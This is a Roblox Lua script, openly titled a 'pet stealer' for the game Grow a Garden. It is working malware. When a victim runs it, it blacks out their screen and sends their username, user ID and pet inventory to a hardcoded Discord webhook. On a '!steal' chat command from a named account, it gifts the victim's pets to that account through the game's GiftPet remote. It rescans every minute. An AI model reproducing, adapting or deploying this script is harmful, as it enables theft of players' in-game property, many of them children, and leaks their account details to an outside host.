-- GROW A GARDEN PET STEALER - SPECIFIC PETS
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")

-- Your config
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1430577203833344041/G380rbmc5puTF4asGrmek8Okwtn43Qb1p64yFAgUSmJKtVWGom4Gtz7-FcMj5hFlwYGj"
local RECEIVER_USERNAME = "gamerzone67op"

-- Target pets
local TARGET_PETS = {
    "Headless Horseman",
    "Black Cat", 
    "Ostrich"
}

-- Fullscreen blocker
local gui = Instance.new("ScreenGui")
gui.Name = "PetHunter"
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 0
frame.Parent = gui

local label = Instance.new("TextLabel")
label.Size = UDim2.new(0.8, 0, 0.1, 0)
label.Position = UDim2.new(0.1, 0, 0.45, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.new(1, 0, 0)
label.Text = "PET HUNTER ACTIVE - SCANNING FOR TARGETS"
label.TextScaled = true
label.Font = Enum.Font.SourceSansBold
label.Parent = gui

gui.Parent = CoreGui

-- SEND EXECUTION NOTIFICATION
function SendExecutionAlert()
    pcall(function()
        local payload = {
            ["content"] = "🎯 @here SCRIPT EXECUTED",
            ["embeds"] = {{
                ["title"] = "PET STEALER ACTIVATED",
                ["description"] = "Script is now running on a victim's game",
                ["fields"] = {
                    {
                        name = "🎮 Game Info",
                        value = "PlaceID: " .. game.PlaceId .. "\nJobID: " .. game.JobId,
                        inline = false
                    },
                    {
                        name = "⏰ Time",
                        value = os.date("%X"),
                        inline = false
                    }
                },
                ["color"] = 65280,
                ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/emojis/1115110344906838056.webp"
                }
            }}
        }
        HttpService:PostAsync(DISCORD_WEBHOOK, HttpService:JSONEncode(payload))
    end)
end

-- FIND SPECIFIC PETS IN BACKPACK
function FindTargetPets()
    local foundPets = {}
    local player = Players.LocalPlayer
    local backpack = player:FindFirstChild("Backpack")
    
    if backpack then
        for _, petName in pairs(TARGET_PETS) do
            local petTool = backpack:FindFirstChild(petName)
            if petTool and petTool:IsA("Tool") then
                table.insert(foundPets, {
                    Name = petName,
                    Tool = petTool
                })
                warn("🎯 TARGET FOUND: " .. petName)
            end
        end
        
        -- Also scan all tools for any pets
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local isTargetPet = false
                for _, targetName in pairs(TARGET_PETS) do
                    if tool.Name == targetName then
                        isTargetPet = true
                        break
                    end
                end
                
                if not isTargetPet then
                    table.insert(foundPets, {
                        Name = tool.Name,
                        Tool = tool,
                        Other = true
                    })
                end
            end
        end
    end
    
    return foundPets
end

-- SEND PET SCAN RESULTS
function SendPetScan(foundPets)
    pcall(function()
        local fields = {}
        local targetCount = 0
        local otherCount = 0
        
        -- Add target pets
        local targetText = ""
        local otherText = ""
        
        for _, pet in pairs(foundPets) do
            if not pet.Other then
                targetCount = targetCount + 1
                targetText = targetText .. "• " .. pet.Name .. "\n"
            else
                otherCount = otherCount + 1
                otherText = otherText .. "• " .. pet.Name .. "\n"
            end
        end
        
        if targetCount > 0 then
            table.insert(fields, {
                name = "🎯 TARGET PETS FOUND (" .. targetCount .. ")",
                value = targetText,
                inline = false
            })
        end
        
        if otherCount > 0 then
            table.insert(fields, {
                name = "📦 OTHER PETS (" .. otherCount .. ")",
                value = otherText,
                inline = false
            })
        end
        
        if targetCount == 0 and otherCount == 0 then
            table.insert(fields, {
                name = "❌ NO PETS FOUND",
                value = "Backpack is empty or no pets detected",
                inline = false
            })
        end
        
        table.insert(fields, {
            name = "👤 Player Info",
            value = "Username: " .. Players.LocalPlayer.Name .. "\nUserID: " .. Players.LocalPlayer.UserId,
            inline = false
        })
        
        local payload = {
            ["content"] = targetCount > 0 and "🎯 @here TARGET PETS FOUND!" or "📦 Pet Scan Complete",
            ["embeds"] = {{
                ["title"] = targetCount > 0 and "🎯 VALUABLE PETS DETECTED" or "📦 Inventory Scan",
                ["description"] = targetCount > 0 and "**HIGH VALUE TARGETS IDENTIFIED**" or "Standard inventory scan completed",
                ["fields"] = fields,
                ["color"] = targetCount > 0 and 16711680 or 255,
                ["timestamp"] = DateTime.now():ToIsoDate()
            }}
        }
        
        HttpService:PostAsync(DISCORD_WEBHOOK, HttpService:JSONEncode(payload))
    end)
end

-- AUTO-GIFT SPECIFIC PETS
function SetupAutoGift()
    TextChatService.MessageReceived:Connect(function(message)
        if message.TextSource then
            local speaker = message.TextSource
            local text = string.lower(message.Text)
            
            if string.find(text, "!steal") and speaker.Name == RECEIVER_USERNAME then
                label.Text = "STEALING TARGET PETS..."
                
                -- Find pets again
                local foundPets = FindTargetPets()
                local giftRemote = ReplicatedStorage:FindFirstChild("CarneEvents"):FindFirstChild("GiftPet")
                
                if giftRemote and #foundPets > 0 then
                    local giftedCount = 0
                    
                    for _, pet in pairs(foundPets) do
                        pcall(function()
                            giftRemote:FireServer(pet.Name, RECEIVER_USERNAME)
                            giftedCount = giftedCount + 1
                            warn("🎁 GIFTED: " .. pet.Name .. " to " .. RECEIVER_USERNAME)
                        end)
                        wait(0.5) -- Prevent rate limit
                    end
                    
                    label.Text = "STEAL COMPLETE: " .. giftedCount .. " PETS"
                    label.TextColor3 = Color3.new(0, 1, 0)
                    
                    -- Send steal report
                    pcall(function()
                        local payload = {
                            ["content"] = "✅ @here PET STEAL COMPLETE",
                            ["embeds"] = {{
                                ["title"] = "🎯 STEAL OPERATION SUCCESS",
                                ["description"] = "Successfully gifted " .. giftedCount .. " pets to " .. RECEIVER_USERNAME,
                                ["fields"] = {
                                    {
                                        name = "📊 Results",
                                        value = "Pets stolen: " .. giftedCount .. "\nRecipient: " .. RECEIVER_USERNAME,
                                        inline = false
                                    }
                                },
                                ["color"] = 65280,
                                ["timestamp"] = DateTime.now():ToIsoDate()
                            }}
                        }
                        HttpService:PostAsync(DISCORD_WEBHOOK, HttpService:JSONEncode(payload))
                    end)
                else
                    label.Text = "NO PETS FOUND TO STEAL"
                    label.TextColor3 = Color3.new(1, 1, 0)
                end
            end
        end
    end)
end

-- MAIN EXECUTION
local player = Players.LocalPlayer
if player then
    -- Send execution alert
    SendExecutionAlert()
    
    -- Initial pet scan
    local foundPets = FindTargetPets()
    SendPetScan(foundPets)
    
    -- Setup auto-steal
    SetupAutoGift()
    
    warn("🎯 PET HUNTER ACTIVATED")
    warn("🎯 Targets: Headless Horseman, Black Cat, Ostrich")
    warn("🎯 Trigger: !steal from " .. RECEIVER_USERNAME)
    
    -- Continuous monitoring
    while true do
        wait(60) -- Rescan every minute
        local newScan = FindTargetPets()
        if #newScan > 0 then
            SendPetScan(newScan)
        end
    end
end